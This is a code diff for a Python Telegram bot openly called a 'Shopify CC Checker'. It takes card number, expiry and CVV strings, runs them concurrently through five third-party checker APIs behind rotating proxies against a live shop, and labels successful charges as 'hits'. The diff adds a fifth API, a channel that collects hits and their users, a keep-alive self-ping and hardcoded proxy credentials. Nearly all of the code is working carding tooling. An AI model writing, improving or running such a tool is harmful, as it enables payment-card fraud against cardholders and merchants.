@@ -28,9 +28,28 @@ def run_server():
     server = HTTPServer(("0.0.0.0", port), SimpleHandler)
     server.serve_forever()
 
+# 🚀 Self-Ping function to prevent Render/Railway from sleeping
+def keep_alive_ping():
+    railway_url = os.environ.get("RAILWAY_STATIC_URL") or os.environ.get("RENDER_EXTERNAL_URL")
+    if not railway_url:
+        return
+    if not railway_url.startswith("http"):
+        railway_url = f"https://{railway_url}"
+        
+    while True:
+        try:
+            with httpx.Client(timeout=10.0) as client:
+                client.get(railway_url)
+                logger.info("Self-ping sent to keep bot alive!")
+        except Exception as e:
+            logger.error(f"Self-ping failed: {e}")
+        # Har 4 minute baad ping karega
+        time.sleep(240)
+
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 OWNER_USERNAME = "@ESCROW2929"
 AUTHORIZED_ADMINS = {8785590284}
+HIT_CHANNEL_ID = -1000000000000  # ⚠️ Apna Telegram Channel ID yahan daal dein
 DATA_FILE = "users_data.json"
 BOT_IS_STOPPED = False
 
@@ -49,7 +68,8 @@ PROXY_LIST = [
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@im-bal.pvdata.host:8080",
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080"
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
+    "px014236.pointtoserver.com:10780:purevpn0s11127688:4mwmyaoa"
 ]
 
 def load_data():
@@ -121,7 +141,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     welcome_text = (
         f"Hello {user.first_name}!\n\n"
-        f"🤖 Shopify CC Checker Bot is Online (4-API Active)\n"
+        f"🤖 Shopify CC Checker Bot is Online (5-API Active)\n"
         f"⚠️ Use /redeem <key> to activate access.\n"
         f"👑 Owner: {OWNER_USERNAME}"
     )
@@ -251,7 +271,6 @@ async def get_bin_info(bin_code):
         pass
     return "UNKNOWN", "UNKNOWN", "UNKNOWN"
 
-# Helper function to fetch from a single API endpoint
 async def fetch_api(client, url):
     try:
         response = await client.get(url)
@@ -263,8 +282,7 @@ async def fetch_api(client, url):
         pass
     return None
 
-# Ultimate 4-API Fastest Response Fetcher
-async def process_card_string(card_line, user_full_name):
+async def process_card_string(card_line, user, context):
     try:
         parts = card_line.split('|')
         if len(parts) < 4:
@@ -274,36 +292,34 @@ async def process_card_string(card_line, user_full_name):
         formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
         bin_info, bank_info, country_info = await get_bin_info(cc[:6])
         
-        site_url = "https://ripnroll.com"
-        selected_proxies = random.sample(PROXY_LIST, min(4, len(PROXY_LIST)))
+        site_url = "https://artpop.com"
+        selected_proxies = random.sample(PROXY_LIST, min(5, len(PROXY_LIST)))
         
         res_data = None
         async with httpx.AsyncClient(timeout=25.0, follow_redirects=True) as client:
-            
-            # 4 Distinct API URLs with 4 different proxies
             url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[0])}"
             url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[1])}"
             url_3 = f"http://216.250.119.63/?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
             url_4 = f"https://shopix.up.railway.app/shopii?cc={quote(formatted_cc)}&site={quote(site_url)}&proxy={quote(selected_proxies[3])}"
+            url_5 = f"http://shopii-api-production.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[4])}"
             
-            # Fire all 4 APIs concurrently and pick the fastest successful response
             tasks = [
                 fetch_api(client, url_1),
                 fetch_api(client, url_2),
                 fetch_api(client, url_3),
-                fetch_api(client, url_4)
+                fetch_api(client, url_4),
+                fetch_api(client, url_5)
             ]
             
             completed = await asyncio.gather(*tasks)
             for res in completed:
                 if res and isinstance(res, dict):
-                    # Check if response has valid data structure
                     if "Response" in res or "Approved" in res or "Charged" in res:
                         res_data = res
                         break
 
         if not res_data:
-            return f"❌ {card_line} ➔ All 4 APIs & Proxies failed/timed out."
+            return f"❌ {card_line} ➔ All 5 APIs & Proxies failed/timed out."
         
         resp_status = res_data.get("Response", "UNKNOWN")
         price = res_data.get("Price", "$14.97")
@@ -314,6 +330,29 @@ async def process_card_string(card_line, user_full_name):
         is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
         hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
         
+        masked_cc = f"{cc[:6]}******{cc[-4:]}|{mes}|{ano}|{cvv}" if len(cc) >= 10 else "******"
+        
+        if is_success:
+            username_str = f"@{user.username}" if user.username else "No Username"
+            channel_msg = (
+                f"⚡💳  # NEW HIT FOUND  💳⚡\n"
+                f"━━━━━━━━━━━━━━━━━\n"
+                f"⚠️ Status: {resp_status}\n"
+                f"💳 Card: `{masked_cc}`\n"
+                f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
+                f"━━━━━━━━━━━━━━━━━\n"
+                f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
+                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
+                f"━━━━━━━━━━━━━━━━━\n"
+                f"👤 **Checked By:** {user.first_name}\n"
+                f"🔗 **Username:** {username_str}\n"
+                f"🆔 **User ID:** `{user.id}`"
+            )
+            try:
+                await context.bot.send_message(chat_id=HIT_CHANNEL_ID, text=channel_msg, parse_mode="Markdown")
+            except Exception:
+                pass
+
         return (
             f"⚡💳  # PRIME CHECKER  💳⚡\n"
             f"━━━━━━━━━━━━━━━━━\n"
@@ -325,16 +364,16 @@ async def process_card_string(card_line, user_full_name):
             f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"👤 Checked By ➠ {user_full_name}"
+            f"👤 Checked By ➠ {user.first_name}"
         )
     except Exception:
         return f"❌ {card_line} ➔ Error occurred."
 
 card_semaphore = asyncio.Semaphore(5)
 
-async def safe_process_card(card_line, user_full_name):
+async def safe_process_card(card_line, user, context):
     async with card_semaphore:
-        return await process_card_string(card_line, user_full_name)
+        return await process_card_string(card_line, user, context)
 
 async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
@@ -345,8 +384,8 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if not context.args:
         return
-    msg = await update.message.reply_text("⏳ Processing with 4 APIs & Proxies...")
-    result = await process_card_string(" ".join(context.args), update.effective_user.first_name)
+    msg = await update.message.reply_text("⏳ Processing with 5 APIs & Proxies...")
+    result = await process_card_string(" ".join(context.args), update.effective_user, context)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)
 
 async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -364,8 +403,8 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not card_lines:
         return
 
-    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards across 4 APIs...")
-    tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
+    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards across 5 APIs...")
+    tasks = [safe_process_card(line, update.effective_user, context) for line in card_lines]
     results = await asyncio.gather(*tasks)
     
     final_output = "\n\n".join(results)[:4000]
@@ -385,13 +424,13 @@ async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not document:
         return
     
-    status_msg = await update.message.reply_text("⏳ Processing file via 4 APIs...")
+    status_msg = await update.message.reply_text("⏳ Processing file via 5 APIs...")
     try:
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
         card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
         
-        tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
+        tasks = [safe_process_card(line, update.effective_user, context) for line in card_lines]
         results = await asyncio.gather(*tasks)
         
         final_output = "\n\n".join(results)[:4000]
@@ -402,7 +441,11 @@ async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     if not TOKEN:
         return
+    
+    # Background server and self-ping threads start kar rahe hain taaki bot sleep na ho
     threading.Thread(target=run_server, daemon=True).start()
+    threading.Thread(target=keep_alive_ping, daemon=True).start()
+    
     app = ApplicationBuilder().token(TOKEN).concurrent_updates(True).build()
     
     app.add_handler(CommandHandler("start", start))
@@ -423,7 +466,14 @@ def main():
     app.add_handler(CommandHandler("chf", chf_file_check))
     app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
     
-    app.run_polling()
+    # Auto-restart loop agar polling kabhi disconnect ho jaye
+    while True:
+        try:
+            logger.info("Starting bot polling...")
+            app.run_polling(drop_pending_updates=True)
+        except Exception as e:
+            logger.error(f"Polling crashed: {e}, restarting in 5 seconds...")
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
